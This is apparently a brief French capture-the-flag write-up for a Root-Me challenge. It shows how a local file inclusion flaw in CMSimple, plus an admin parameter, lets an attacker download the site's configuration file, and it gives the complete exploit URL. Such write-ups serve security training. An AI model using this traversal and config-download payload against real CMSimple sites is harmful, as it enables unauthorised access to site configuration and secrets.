@@ -1,0 +1,5 @@
+On cherche sur internet les failles lfi sur cmsimple. On voit : index.php?sl=../
+En regardant dans les source, on voit que adm.php est disponible que si le paramètre adm est défini : &adm=1
+On voit qu'on peut telecharger le fichier de config : &file=config&action=download
+
+Le lien final : http://challenge01.root-me.org/realiste/ch6/index.php?sl=../adm&file=config&action=download&adm=2
